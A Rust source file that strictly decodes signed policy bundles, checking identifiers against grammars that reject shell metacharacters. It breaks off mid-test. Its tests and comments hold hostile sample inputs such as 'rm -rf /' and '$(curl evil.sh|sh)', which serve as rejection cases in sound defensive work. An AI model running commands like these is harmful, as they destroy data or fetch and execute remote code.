//! Strict typed decode of the six PolicyBundle sections (07 §"PolicyBundle
//! v1", decode-time rejection rules 1–4):
//!
//! * **No command strings, structurally** (rule 1): every `tstr` is validated
//!   against its production — a constrained identifier, an RFC 6901 JSON
//!   pointer, or a closed enum. A failing string rejects the WHOLE bundle as
//!   `M1E-3005`; there is no partial acceptance.
//! * **Strict maps everywhere** (rule 3): an unknown key fails decode —
//!   tolerated strays are how command fields sneak in later.
//! * Anchors are catalog-ID enables only (rule 2); no `wasm_module` or any
//!   executable field exists to decode (rule 4).
//!
//! The grammars are hand-rolled byte predicates rather than compiled regexes:
//! the productions are single character classes plus the RFC 6901 escape
//! rule, and a predicate has no fallible pattern-compile step to launder
//! through a denied `expect` in static init. Each predicate names the CDDL
//! production it implements.

use std::collections::BTreeMap;

use ciborium::value::Value;

use crate::types::{
    AgentMap, AgentMaps, AnchorEnable, CorrelationGroup, CortexChannel, CortexSection, CostBasis,
    CpvsRow, GatesSection, InjectionRule, KneeRow, KneeTable, Ladder, LearnedRanker, MemorySection,
    Posterior4, RankerStage, RouteSection, Rung, Signal3, VerifierModel, VerifySection,
};
use crate::Reject;

// ── the CDDL string productions ─────────────────────────────────────────

/// `catalog_id: tstr .regexp "[a-z0-9_.-]{1,64}"`.
///
/// 04 §7.3 states a different catalog grammar (`^[a-z0-9-]+@cat-[0-9]+$`);
/// 07's CDDL is the schema of record ("fixed by this document's CDDL") and
/// `@` fails this production — the contradiction is reported, not blended.
fn is_catalog_id(s: &str) -> bool {
    ident(s, 64, |c| {
        c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '.' | '-')
    })
}

/// `verifier-id = tstr .regexp "[a-z0-9_.@-]{1,128}"`.
fn is_verifier_id(s: &str) -> bool {
    ident(s, 128, |c| {
        c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '.' | '@' | '-')
    })
}

/// `m1p-field = tstr .regexp "[a-z0-9_.]{1,64}"`.
fn is_m1p_field(s: &str) -> bool {
    ident(s, 64, |c| {
        c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '.')
    })
}

/// The conservative fallback production for the `tstr` fields 07's CDDL
/// leaves bare (channel, group_id, task_class, model_id, ladder_id, facet,
/// agent_id, agent_version, threshold keys, tailer-rule keys). Rule 1 claims
/// every tstr is constrained, so the bare ones get the boring superset: no
/// whitespace, no path separator, no shell metacharacter can pass (04 §7.3's
/// rejection triad).
fn is_free_ident(s: &str) -> bool {
    ident(s, 128, |c| {
        c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | ':' | '@' | '-')
    })
}

/// `json-pointer = tstr .size (0..1024) .regexp "(/[^/~]*(~[01][^/~]*)*)*"` —
/// RFC 6901: empty, or '/'-prefixed segments where every '~' escapes as '~0'
/// or '~1'. The .size bound is not decoration (07): the regexp admits ANY
/// byte except an unescaped '~' — review landed `;rm -rf / #`, `$(curl ...)`,
/// newlines and a 4001-char pointer through a SIGNED bundle, all
/// regexp-conformant. "Structurally incapable of naming a command" therefore
/// rests on the CONSUMER resolving these as RFC 6901 pointers, never as
/// text; the length bound is the part decode can enforce.
fn is_json_pointer(s: &str) -> bool {
    if s.len() > 1024 {
        return false;
    }
    if s.is_empty() {
        return true;
    }
    if !s.starts_with('/') {
        return false;
    }
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '~' && !matches!(chars.next(), Some('0') | Some('1')) {
            return false;
        }
    }
    true
}

fn ident(s: &str, max: usize, ok: fn(char) -> bool) -> bool {
    !s.is_empty() && s.len() <= max && s.chars().all(ok)
}

// ── Value extraction helpers (every mismatch is a whole-bundle reject) ──

fn schema(path: &str, detail: impl Into<String>) -> Reject {
    Reject::Schema {
        path: path.to_string(),
        detail: detail.into(),
    }
}

pub(crate) fn map_of<'a>(v: &'a Value, path: &str) -> Result<BTreeMap<&'a str, &'a Value>, Reject> {
    let Value::Map(entries) = v else {
        return Err(schema(path, "expected map"));
    };
    let mut out = BTreeMap::new();
    for (k, val) in entries {
        let Value::Text(k) = k else {
            return Err(schema(path, "non-text map key"));
        };
        // The canonical-form check already forbids duplicate keys; this is
        // the local restatement so this module is safe standalone.
        if out.insert(k.as_str(), val).is_some() {
            return Err(schema(path, format!("duplicate key {k}")));
        }
    }
    Ok(out)
}

/// Strict-map rule (07 rule 3): the key set must be exactly `required` plus a
/// subset of `optional` — an unknown key fails decode of the whole bundle.
pub(crate) fn strict_keys(
    m: &BTreeMap<&str, &Value>,
    required: &[&str],
    optional: &[&str],
    path: &str,
) -> Result<(), Reject> {
    for k in required {
        if !m.contains_key(k) {
            return Err(schema(path, format!("missing key {k}")));
        }
    }
    for k in m.keys() {
        if !required.contains(k) && !optional.contains(k) {
            return Err(schema(path, format!("unknown key {k}")));
        }
    }
    Ok(())
}

pub(crate) fn uint(v: &Value, path: &str) -> Result<u64, Reject> {
    let Value::Integer(i) = v else {
        return Err(schema(path, "expected uint"));
    };
    u64::try_from(i128::from(*i)).map_err(|_| schema(path, "uint out of range"))
}

fn boolean(v: &Value, path: &str) -> Result<bool, Reject> {
    let Value::Bool(b) = v else {
        return Err(schema(path, "expected bool"));
    };
    Ok(*b)
}

pub(crate) fn text<'a>(v: &'a Value, path: &str) -> Result<&'a str, Reject> {
    let Value::Text(t) = v else {
        return Err(schema(path, "expected tstr"));
    };
    Ok(t)
}

pub(crate) fn array<'a>(v: &'a Value, path: &str) -> Result<&'a [Value], Reject> {
    let Value::Array(a) = v else {
        return Err(schema(path, "expected array"));
    };
    Ok(a)
}

/// A finite float — NaN/∞ never enter the eval structs (a NaN in a prior
/// poisons every posterior downstream without ever failing a comparison).
fn finite(v: &Value, path: &str) -> Result<f64, Reject> {
    let Value::Float(f) = v else {
        return Err(schema(path, "expected float"));
    };
    if !f.is_finite() {
        return Err(schema(path, "non-finite float"));
    }
    Ok(*f)
}

/// A probability: finite and in [0, 1].
fn prob(v: &Value, path: &str) -> Result<f64, Reject> {
    let f = finite(v, path)?;
    if !(0.0..=1.0).contains(&f) {
        return Err(schema(path, "probability outside [0,1]"));
    }
    Ok(f)
}

/// A grammar-checked string — failure is the M1E-3005 structural rejection
/// (07 rule 1): invalid is a security event, never applied piecewise.
fn checked(v: &Value, path: &str, production: fn(&str) -> bool) -> Result<String, Reject> {
    let t = text(v, path)?;
    if !production(t) {
        return Err(Reject::CommandString {
            path: path.to_string(),
        });
    }
    Ok(t.to_string())
}

/// D-R's NORMATIVE distribution check: a per-entry [0,1] range check is NOT
/// sufficient — all-zero `priors` passes ranges and then detonates the Python
/// twin's softmax ("zero posterior mass") at fusion time, i.e. a validly
/// signed bundle that fails at runtime instead of at decode. Tolerance 1e-9:
/// ~7 decimal digits looser than the worst f64 rounding of 3–4 shortest-float
/// decimal literals (≤ a few ulp ≈ 1e-15), yet far below any probability mass
/// a compiler could meaningfully misplace.
const DIST_SUM_TOL: f64 = 1e-9;

fn sums_to_one(entries: &[f64], path: &str) -> Result<(), Reject> {
    let sum: f64 = entries.iter().sum();
    if (sum - 1.0).abs() > DIST_SUM_TOL {
        return Err(schema(path, format!("distribution sums to {sum}, not 1.0")));
    }
    Ok(())
}

fn posterior4(v: &Value, path: &str) -> Result<Posterior4, Reject> {
    let a = array(v, path)?;
    if a.len() != 4 {
        return Err(schema(path, "posterior4 must have exactly 4 entries"));
    }
    let p = [
        prob(&a[0], path)?,
        prob(&a[1], path)?,
        prob(&a[2], path)?,
        prob(&a[3], path)?,
    ];
    sums_to_one(&p, path)?;
    Ok(p)
}

/// `signal3 = [accept, reject, abstain]` (D-R) — a proper distribution over
/// the observed-signal vocabulary, enforced like `posterior4`.
fn signal3(v: &Value, path: &str) -> Result<Signal3, Reject> {
    let a = array(v, path)?;
    if a.len() != 3 {
        return Err(schema(path, "signal3 must have exactly 3 entries"));
    }
    let s = [prob(&a[0], path)?, prob(&a[1], path)?, prob(&a[2], path)?];
    sums_to_one(&s, path)?;
    Ok(s)
}

// ── section decoders ────────────────────────────────────────────────────

/// `channel` rides the envelope, which is parsed BEFORE any signature check
/// (its value feeds the signing input). The same identifier production
/// applies, but a violation here is `Schema`, never `CommandString`: 05
/// §4.3's halt condition treats any M1E-3005 ACK as a compiler P1 — freeze
/// the rollout, page the on-call — and pre-signature bytes are
/// UNAUTHENTICATED, so classifying them as 3005 hands that pager to any
/// attacker who can reach the endpoint. 3005 is reserved for
/// string-production violations in SIGNED content.
pub(crate) fn check_channel(v: &Value, path: &str) -> Result<String, Reject> {
    let t = text(v, path)?;
    if !is_free_ident(t) {
        return Err(schema(path, "channel fails the identifier production"));
    }
    Ok(t.to_string())
}

pub(crate) fn decode_verify(v: &Value) -> Result<VerifySection, Reject> {
    let p = "sections.verify";
    let m = map_of(v, p)?;
    strict_keys(
        &m,
        &[
            "anchors",
            "verifiers",
            "priors",
            "correlation_groups",
            "quarantine",
        ],
        &[],
        p,
    )?;

    let mut anchors = Vec::new();
    for (i, av) in array(m["anchors"], p)?.iter().enumerate() {
        let ap = format!("{p}.anchors[{i}]");
        let am = map_of(av, &ap)?;
        strict_keys(
            &am,
            &["catalog_id", "enabled"],
            &["thresholds", "debounce_ms"],
            &ap,
        )?;
        let mut thresholds = Vec::new();
        if let Some(tv) = am.get("thresholds") {
            for (k, val) in map_of(tv, &ap)? {
                if !is_free_ident(k) {
                    return Err(Reject::CommandString {
                        path: format!("{ap}.thresholds.{k}"),
                    });
                }
                thresholds.push((k.to_string(), finite(val, &ap)?));
            }
        }
        anchors.push(AnchorEnable {
            catalog_id: checked(am["catalog_id"], &format!("{ap}.catalog_id"), is_catalog_id)?,
            enabled: boolean(am["enabled"], &ap)?,
            thresholds,
            debounce_ms: am.get("debounce_ms").map(|d| uint(d, &ap)).transpose()?,
        });
    }

    let mut verifiers = Vec::new();
    let mut index_of: BTreeMap<String, u32> = BTreeMap::new();
    for (i, vv) in array(m["verifiers"], p)?.iter().enumerate() {
        let vp = format!("{p}.verifiers[{i}]");
        let vm = map_of(vv, &vp)?;
        strict_keys(&vm, &["verifier_id", "confusion"], &[], &vp)?;
        let verifier_id = checked(
            vm["verifier_id"],
            &format!("{vp}.verifier_id"),
            is_verifier_id,
        )?;
        if index_of.insert(verifier_id.clone(), i as u32).is_some() {
            return Err(schema(&vp, "duplicate verifier_id"));
        }
        // D-R: `confusion4x3` — 4 true-verdict rows, each a signal3 over
        // (accept, reject, abstain). The abstain column subsumes the deleted
        // `abstention` model.
        let rows = array(vm["confusion"], &vp)?;
        if rows.len() != 4 {
            return Err(schema(&vp, "confusion must be 4x3"));
        }
        let confusion = [
            signal3(&rows[0], &vp)?,
            signal3(&rows[1], &vp)?,
            signal3(&rows[2], &vp)?,
            signal3(&rows[3], &vp)?,
        ];
        verifiers.push(VerifierModel {
            verifier_id,
            confusion,
        });
    }

    // Ids resolve to indices HERE so fusion never compares a string (04 §7.3
    // "no map lookups or string compares on the gate/route path").
    let resolve = |val: &Value, path: &str| -> Result<u32, Reject> {
        let id = checked(val, path, is_verifier_id)?;
        index_of
            .get(&id)
            .copied()
            .ok_or_else(|| schema(path, format!("unknown verifier_id {id}")))
    };

    let mut correlation_groups = Vec::new();
    for (i, gv) in array(m["correlation_groups"], p)?.iter().enumerate() {
        let gp = format!("{p}.correlation_groups[{i}]");
        let gm = map_of(gv, &gp)?;
        strict_keys(&gm, &["group_id", "members"], &[], &gp)?;
        let raw_members = array(gm["members"], &gp)?;
        if raw_members.is_empty() {
            return Err(schema(&gp, "members must be non-empty")); // CDDL [+ verifier-id]
        }
        let mut members = Vec::with_capacity(raw_members.len());
        for mv in raw_members {
            let idx = resolve(mv, &gp)?;
            if members.contains(&idx) {
                return Err(schema(&gp, "duplicate group member")); // one observation, listed twice
            }
            members.push(idx);
        }
        correlation_groups.push(CorrelationGroup {
            group_id: checked(gm["group_id"], &format!("{gp}.group_id"), is_free_ident)?,
            members,
        });
    }

    let mut quarantined = vec![false; verifiers.len()];
    for qv in array(m["quarantine"], p)? {
        quarantined[resolve(qv, &format!("{p}.quarantine"))? as usize] = true;
    }

    Ok(VerifySection {
        anchors,
        verifiers,
        priors: posterior4(m["priors"], &format!("{p}.priors"))?,
        correlation_groups,
        quarantined,
    })
}

pub(crate) fn decode_route(v: &Value) -> Result<RouteSection, Reject> {
    let p = "sections.route";
    let m = map_of(v, p)?;
    strict_keys(
        &m,
        &["cpvs", "ladders", "knee"],
        &["exploration", "exploration_opt_in"],
        p,
    )?;

    let mut cpvs = Vec::new();
    for (i, rv) in array(m["cpvs"], p)?.iter().enumerate() {
        let rp = format!("{p}.cpvs[{i}]");
        let rm = map_of(rv, &rp)?;
        strict_keys(
            &rm,
            &["task_class", "model_id", "p_pass", "tokens_est"],
            &[],
            &rp,
        )?;
        cpvs.push(CpvsRow {
            task_class: checked(rm["task_class"], &format!("{rp}.task_class"), is_free_ident)?,
            model_id: checked(rm["model_id"], &format!("{rp}.model_id"), is_free_ident)?,
            p_pass: prob(rm["p_pass"], &rp)?,
            tokens_est: uint(rm["tokens_est"], &rp)?,
        });
    }

    let mut ladders = Vec::new();
    for (i, lv) in array(m["ladders"], p)?.iter().enumerate() {
        let lp = format!("{p}.ladders[{i}]");
        let lm = map_of(lv, &lp)?;
        strict_keys(&lm, &["ladder_id", "rungs"], &[], &lp)?;
        let raw_rungs = array(lm["rungs"], &lp)?;
        if raw_rungs.is_empty() {
            return Err(schema(&lp, "rungs must be non-empty")); // CDDL [+ rung]
        }
        let mut rungs = Vec::with_capacity(raw_rungs.len());
        for rv in raw_rungs {
            let rm = map_of(rv, &lp)?;
            strict_keys(&rm, &["model_id", "keep_prefix"], &[], &lp)?;
            rungs.push(Rung {
                model_id: checked(rm["model_id"], &format!("{lp}.model_id"), is_free_ident)?,
                keep_prefix: boolean(rm["keep_prefix"], &lp)?,
            });
        }
        ladders.push(Ladder {
            ladder_id: checked(lm["ladder_id"], &format!("{lp}.ladder_id"), is_free_ident)?,
            rungs,
        });
    }

    let kp = format!("{p}.knee");
    let km = map_of(m["knee"], &kp)?;
    strict_keys(&km, &["cost_basis", "rows", "v_default"], &[], &kp)?;
    let cost_basis = match text(km["cost_basis"], &kp)? {
        "usd" => CostBasis::Usd,
        "quota" => CostBasis::Quota,
        // Closed enum (07 rule 1c) — but a typo'd basis is a SCHEMA defect
        // (M1E-3001), not command_string: 05 §4.3 pages a human on any
        // M1E-3005 ACK, and a two-value enum miss is a compiler typo, not
        // smuggled shell. 3005 stays reserved for the string PRODUCTIONS.
        other => {
            return Err(schema(
                &format!("{kp}.cost_basis"),
                format!("not a cost basis: {other}"),
            ))
        }
    };
    let raw_rows = array(km["rows"], &kp)?;
    if raw_rows.is_empty() {
        return Err(schema(&kp, "rows must be non-empty")); // CDDL [+ row]
    }
    let mut rows = Vec::with_capacity(raw_rows.len());
    for rv in raw_rows {
        let rm = map_of(rv, &kp)?;
        strict_keys(&rm, &["n", "c_n"], &["p_lcb"], &kp)?;
        let c_n = finite(rm["c_n"], &kp)?;
        if c_n < 0.0 {
            return Err(schema(&kp, "c_n must be >= 0")); // a negative cost never arrests a retry
        }
        rows.push(KneeRow {
            n: uint(rm["n"], &kp)?,
            c_n,
            p_lcb: rm.get("p_lcb").map(|v| prob(v, &kp)).transpose()?,
        });
    }
    let v_default = finite(km["v_default"], &kp)?;
    if v_default < 0.0 {
        return Err(schema(&kp, "v_default must be >= 0"));
    }

    let mut exploration_epsilon = 0.0; // .default 0.0 — propensity 1.0 logged honestly
    if let Some(ev) = m.get("exploration") {
        let ep = format!("{p}.exploration");
        let em = map_of(ev, &ep)?;
        strict_keys(&em, &[], &["epsilon"], &ep)?;
        if let Some(e) = em.get("epsilon") {
            exploration_epsilon = prob(e, &ep)?;
        }
    }
    // D-EF: ε>0 needs the publisher-signed opt-in; absent or present-false both refuse (fail closed, same as the publisher).
    let op = format!("{p}.exploration_opt_in");
    let opt_in = match m.get("exploration_opt_in") {
        Some(o) => boolean(o, &op)?,
        None => false,
    };
    if !opt_in && exploration_epsilon > 0.0 {
        return Err(schema(&op, "exploration.epsilon > 0 without opt-in"));
    }

    Ok(RouteSection {
        cpvs,
        ladders,
        knee: KneeTable {
            cost_basis,
            rows,
            v_default,
        },
        exploration_epsilon,
    })
}

pub(crate) fn decode_memory(v: &Value) -> Result<MemorySection, Reject> {
    let p = "sections.memory";
    let m = map_of(v, p)?;
    strict_keys(&m, &["injection_rules", "budgets"], &[], p)?;
    let mut injection_rules = Vec::new();
    for (i, rv) in array(m["injection_rules"], p)?.iter().enumerate() {
        let rp = format!("{p}.injection_rules[{i}]");
        let rm = map_of(rv, &rp)?;
        strict_keys(&rm, &["facet"], &["max_items"], &rp)?;
        injection_rules.push(InjectionRule {
            facet: checked(rm["facet"], &format!("{rp}.facet"), is_free_ident)?,
            max_items: rm.get("max_items").map(|x| uint(x, &rp)).transpose()?,
        });
    }
    let bp = format!("{p}.budgets");
    let bm = map_of(m["budgets"], &bp)?;
    strict_keys(&bm, &["pack_tokens_max"], &[], &bp)?;
    Ok(MemorySection {
        injection_rules,
        pack_tokens_max: uint(bm["pack_tokens_max"], &bp)?,
    })
}

pub(crate) fn decode_cortex(v: &Value) -> Result<CortexSection, Reject> {
    let p = "sections.cortex";
    let m = map_of(v, p)?;
    strict_keys(
        &m,
        &["map_budget_tokens", "channels"],
        &["learned_ranker"],
        p,
    )?;
    let bp = format!("{p}.map_budget_tokens");
    let bm = map_of(m["map_budget_tokens"], &bp)?;
    strict_keys(&bm, &["min", "max"], &[], &bp)?;
    let min = uint(bm["min"], &bp)?;
    let max = uint(bm["max"], &bp)?;
    if min > max {
        return Err(schema(&bp, "min > max")); // binary-search bounds must be an interval
    }
    let mut channels = Vec::new();
    for cv in array(m["channels"], p)? {
        channels.push(match text(cv, p)? {
            "session_start" => CortexChannel::SessionStart,
            "prompt_submit" => CortexChannel::PromptSubmit,
            "before_model" => CortexChannel::BeforeModel,
            // Closed enum (07 rule 1c) → Schema, same reasoning as
            // cost_basis: enum misses are M1E-3001, not the paged 3005.
            other => {
                return Err(schema(
                    &format!("{p}.channels"),
                    format!("not a cortex channel: {other}"),
                ))
            }
        });
    }
    let learned_ranker = m
        .get("learned_ranker")
        .map(|v| decode_ranker(v, &format!("{p}.learned_ranker")))
        .transpose()?;
    Ok(CortexSection {
        map_budget_tokens_min: min,
        map_budget_tokens_max: max,
        channels,
        learned_ranker,
    })
}

fn decode_ranker(v: &Value, p: &str) -> Result<LearnedRanker, Reject> {
    let m = map_of(v, p)?;
    strict_keys(&m, &["stage", "weight", "bias", "coefficients"], &[], p)?;
    let sp = format!("{p}.stage");
    let stage = match text(m["stage"], &sp)? {
        "probation" => RankerStage::Probation,
        "shadow" => RankerStage::Shadow,
        "active" => RankerStage::Active,
        other => return Err(schema(&sp, format!("not a ranker stage: {other}"))),
    };
    let cp = format!("{p}.coefficients");
    let c = array(m["coefficients"], &cp)?;
    if c.len() != 4 {
        return Err(schema(&cp, "coefficients must have exactly 4 entries"));
    }
    Ok(LearnedRanker {
        stage,
        weight: prob(m["weight"], &format!("{p}.weight"))?,
        bias: finite(m["bias"], &format!("{p}.bias"))?,
        coefficients: [
            finite(&c[0], &cp)?,
            finite(&c[1], &cp)?,
            finite(&c[2], &cp)?,
            finite(&c[3], &cp)?,
        ],
    })
}

pub(crate) fn decode_gates(v: &Value) -> Result<GatesSection, Reject> {
    let p = "sections.gates";
    let m = map_of(v, p)?;
    strict_keys(
        &m,
        &[
            "stop_gate_enabled",
            "max_consecutive_blocks",
            "hourly_block_ceiling",
        ],
        &[],
        p,
    )?;
    let mcb = uint(m["max_consecutive_blocks"], p)?;
    if mcb > 3 {
        // CDDL `.le 3`: a bundle may LOWER the local hard cap, never raise it.
        return Err(schema(p, "max_consecutive_blocks > 3"));
    }
    let hbc = uint(m["hourly_block_ceiling"], p)?;
    if hbc > MAX_HOURLY_BLOCK_CEILING {
        // Same direction as mcb (FR-VERIFY-010): lower only; 0 = edge default.
        return Err(schema(p, "hourly_block_ceiling > 30"));
    }
    Ok(GatesSection {
        stop_gate_enabled: boolean(m["stop_gate_enabled"], p)?,
        max_consecutive_blocks: mcb as u8,
        hourly_block_ceiling: hbc,
    })
}

/// ponytail: 30 mirrors mark1d `fabric/gate.go:27 DefaultHourlyCeiling` (and
/// controld `policydist/bundle.go maxHourlyBlockCeiling`) — 07's CDDL types
/// `hourly_block_ceiling` as a bare `uint` and no doc names a number, so the
/// edge built-in is the only ceiling a bundle can lower. Hand-copied const:
/// bump all three or none.
const MAX_HOURLY_BLOCK_CEILING: u64 = 30;

pub(crate) fn decode_agent_maps(v: &Value) -> Result<AgentMaps, Reject> {
    let p = "sections.agent_maps";
    let m = map_of(v, p)?;
    strict_keys(&m, &["agents"], &[], p)?;
    let mut agents = Vec::new();
    for (i, av) in array(m["agents"], p)?.iter().enumerate() {
        let ap = format!("{p}.agents[{i}]");
        let am = map_of(av, &ap)?;
        strict_keys(
            &am,
            &["agent_id", "agent_version", "hook_fields", "tailer_rules"],
            &[],
            &ap,
        )?;
        let mut hook_fields = Vec::new();
        for (k, val) in map_of(am["hook_fields"], &ap)? {
            if !is_m1p_field(k) {
                return Err(Reject::CommandString {
                    path: format!("{ap}.hook_fields.{k}"),
                });
            }
            hook_fields.push((
                k.to_string(),
                checked(val, &format!("{ap}.hook_fields.{k}"), is_json_pointer)?,
            ));
        }
        let mut tailer_rules = Vec::new();
        for (k, val) in map_of(am["tailer_rules"], &ap)? {
            if !is_free_ident(k) {
                return Err(Reject::CommandString {
                    path: format!("{ap}.tailer_rules.{k}"),
                });
            }
            tailer_rules.push((
                k.to_string(),
                checked(val, &format!("{ap}.tailer_rules.{k}"), is_json_pointer)?,
            ));
        }
        agents.push(AgentMap {
            agent_id: checked(am["agent_id"], &format!("{ap}.agent_id"), is_free_ident)?,
            agent_version: checked(
                am["agent_version"],
                &format!("{ap}.agent_version"),
                is_free_ident,
            )?,
            hook_fields,
            tailer_rules,
        });
    }
    Ok(AgentMaps { agents })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn productions_reject_the_04_triad() {
        // 04 §7.3: whitespace, path separators and shell metacharacters must
        // fail — across EVERY identifier production, not just catalog_id.
        for bad in ["rm -rf /", "a/b", "a;b", "$(x)", "`x`", "a|b", "", "a\nb"] {
            assert!(!is_catalog_id(bad), "catalog_id accepted {bad:?}");
            assert!(!is_verifier_id(bad), "verifier_id accepted {bad:?}");
            assert!(!is_m1p_field(bad), "m1p_field accepted {bad:?}");
            assert!(!is_free_ident(bad), "free_ident accepted {bad:?}");
        }
        assert!(is_catalog_id("cargo-test.v1"));
        assert!(!is_catalog_id("linters@cat-1")); // 07's CDDL has no '@' — the 04 grammar contradiction
        assert!(is_verifier_id("pytest@3.1"));
        assert!(is_m1p_field("usage.input_tokens"));
        assert!(is_free_ident("claude-sonnet-4-5"));
        assert!(!is_catalog_id(&"a".repeat(65)));
        assert!(!is_verifier_id(&"a".repeat(129)));
    }

    #[test]
    fn gates_cap_and_strict_maps_are_bounds() {
        // CDDL `.le 3`: a bundle may lower the local hard cap, never raise it.
        let gates = Value::Map(vec![
            (Value::Text("stop_gate_enabled".into()), Value::Bool(true)),
            (
                Value::Text("max_consecutive_blocks".into()),
                Value::Integer(4.into()),
            ),
            (
                Value::Text("hourly_block_ceiling".into()),
                Value::Integer(1.into()),
            ),
        ]);
        assert!(matches!(decode_gates(&gates), Err(Reject::Schema { .. })));
        // Same direction for hourly_block_ceiling: 31 > the edge built-in 30.
        let hourly = Value::Map(vec![
            (Value::Text("stop_gate_enabled".into()), Value::Bool(true)),
            (
                Value::Text("max_consecutive_blocks".into()),
                Value::Integer(3.into()),
            ),
            (
                Value::Text("hourly_block_ceiling".into()),
                Value::Integer(31.into()),
            ),
        ]);
        assert!(matches!(decode_gates(&hourly), Err(Reject::Schema { .. })));
        // Rule 3/4: a stray key — the exact shape a future `wasm_module`
        // would take — fails decode, it is never tolerated.
        let stray = Value::Map(vec![(Value::Text("wasm_module".into()), Value::Bool(true))]);
        assert!(matches!(decode_memory(&stray), Err(Reject::Schema { .. })));
    }

    /// A minimal verify section with pluggable priors + one verifier's
    /// confusion rows — the D-R test rig.
    fn verify_section(priors: [f64; 4], rows: &[Value]) -> Value {
        let txt = |s: &str| Value::Text(s.into());
        Value::Map(vec![
            (txt("anchors"), Value::Array(vec![])),
            (
                txt("verifiers"),
                Value::Array(vec![Value::Map(vec![
                    (txt("verifier_id"), txt("anchor.test")),
                    (txt("confusion"), Value::Array(rows.to_vec())),
                ])]),
            ),
            (
                txt("priors"),
                Value::Array(priors.iter().map(|p| Value::Float(*p)).collect()),
            ),
            (txt("correlation_groups"), Value::Array(vec![])),
            (txt("quarantine"), Value::Array(vec![])),
        ])
    }

    fn s3(r: [f64; 3]) -> Value {
        Value::Array(r.iter().map(|p| Value::Float(*p)).collect())
    }

    #[test]
    fn d_r_confusion_is_4x3_and_rows_are_distributions() {
        let good_row = [0.9, 0.05, 0.05];
        let priors = [0.55, 0.25, 0.1, 0.1];
        // The D-R shape: 4 rows × 3 signal columns decodes.
        let ok = verify_section(priors, &vec![s3(good_row); 4]);
        assert!(decode_verify(&ok).is_ok());
        // The pre-D-R 4x4 verdict×verdict shape is dead.
        let p4 = Value::Array((0..4).map(|_| Value::Float(0.25)).collect());
        let four_by_four = verify_section(priors, &vec![p4; 4]);
        assert!(matches!(
            decode_verify(&four_by_four),
            Err(Reject::Schema { .. })
        ));
        // A row of in-range floats that is not a distribution dies at decode
        // (rows summing to 3.0 passed the old per-entry range check).
        let hot = verify_section(priors, &vec![s3([1.0, 1.0, 1.0]); 4]);
        assert!(matches!(decode_verify(&hot), Err(Reject::Schema { .. })));
        // All-zero priors: the exact input that made the Python twin's
        // softmax raise "zero posterior mass" at runtime — now an M1E-3001.
        let zero_priors = verify_section([0.0; 4], &vec![s3(good_row); 4]);
        assert!(matches!(
            decode_verify(&zero_priors),
            Err(Reject::Schema { .. })
        ));
        // Shortest-float decimal rounding stays inside the tolerance.
        let uneven = verify_section([0.3, 0.3, 0.3, 0.1], &vec![s3([0.7, 0.2, 0.1]); 4]);
        assert!(decode_verify(&uneven).is_ok());
    }

    #[test]
    fn m1e_3005_is_reserved_for_signed_string_productions() {
        let txt = |s: &str| Value::Text(s.into());
        // A typo'd closed enum is a Schema defect (M1E-3001), never the
        // command_string reject 05 §4.3 pages a human for.
        let route = Value::Map(vec![
            (txt("cpvs"), Value::Array(vec![])),
            (txt("ladders"), Value::Array(vec![])),
            (
                txt("knee"),
                Value::Map(vec![
                    (txt("cost_basis"), txt("usdd")),
                    (
                        txt("rows"),
                        Value::Array(vec![Value::Map(vec![
                            (txt("n"), Value::Integer(1.into())),
                            (txt("c_n"), Value::Float(0.5)),
                        ])]),
                    ),
                    (txt("v_default"), Value::Float(1.0)),
                ]),
            ),
        ]);
        assert!(matches!(decode_route(&route), Err(Reject::Schema { .. })));
        let cortex = Value::Map(vec![
            (
                txt("map_budget_tokens"),
                Value::Map(vec![
                    (txt("min"), Value::Integer(1.into())),
                    (txt("max"), Value::Integer(2.into())),
                ]),
            ),
            (txt("channels"), Value::Array(vec![txt("rm -rf /")])),
        ]);
        assert!(matches!(decode_cortex(&cortex), Err(Reject::Schema { .. })));
        // The envelope channel is parsed BEFORE signatures: hostile
        // UNAUTHENTICATED bytes there must classify as Schema, not as the
        // paged M1E-3005.
        assert!(matches!(
            check_channel(&txt("$(curl evil.sh|sh)"), "bundle.channel"),
            Err(Reject::Schema { .. })
        ));
        assert!(check_channel(&txt("stable"), "bundle.channel").is_ok());
    }

    #[test]
    fn d_z_knee_p_lcb_is_optional_and_range_checked() {
        let txt = |s: &str| Value::Text(s.into());
        let route = |row: Vec<(Value, Value)>| {
            Value::Map(vec![
                (txt("cpvs"), Value::Array(vec![])),
                (txt("ladders"), Value::Array(vec![])),
                (
                    txt("knee"),
                    Value::Map(vec![
                        (txt("cost_basis"), txt("usd")),
                        (txt("rows"), Value::Array(vec![Value::Map(row)])),
                        (txt("v_default"), Value::Float(1.0)),
                    ]),
                ),
            ])
        };
        let base = vec![
            (txt("n"), Value::Integer(1.into())),
            (txt("c_n"), Value::Float(0.5)),
        ];
        let with = |p: Value| {
            let mut r = base.clone();
            r.push((txt("p_lcb"), p));
            r
        };
        // Absent ⇒ None, never 0.0: an unfitted row must not look like a
        // certainly-hopeless one (D-Z).
        assert_eq!(
            decode_route(&route(base.clone())).unwrap().knee.rows[0].p_lcb,
            None
        );
        assert_eq!(
            decode_route(&route(with(Value::Float(0.0))))
                .unwrap()
                .knee
                .rows[0]
                .p_lcb,
            Some(0.0)
        );
        assert_eq!(
            decode_route(&route(with(Value::Float(0.8))))
                .unwrap()
                .knee
                .rows[0]
                .p_lcb,
            Some(0.8)
        );
        for bad in [
            Value::Float(1.5),
            Value::Float(-0.1),
            Value::Float(f64::NAN),
        ] {
            assert!(matches!(
                decode_route(&route(with(bad))),
                Err(Reject::Schema { .. })
            ));
        }
    }

    #[test]
    fn d_ef_epsilon_needs_the_signed_opt_in_present_or_absent() {
        let txt = |s: &str| Value::Text(s.into());
        let route = |eps: f64, opt_in: Option<Value>| {
            let mut m = vec![
                (txt("cpvs"), Value::Array(vec![])),
                (txt("ladders"), Value::Array(vec![])),
                (
                    txt("knee"),
                    Value::Map(vec![
                        (txt("cost_basis"), txt("usd")),
                        (
                            txt("rows"),
                            Value::Array(vec![Value::Map(vec![
                                (txt("n"), Value::Integer(1.into())),
                                (txt("c_n"), Value::Float(0.5)),
                            ])]),
                        ),
                        (txt("v_default"), Value::Float(1.0)),
                    ]),
                ),
                (
                    txt("exploration"),
                    Value::Map(vec![(txt("epsilon"), Value::Float(eps))]),
                ),
            ];
            if let Some(o) = opt_in {
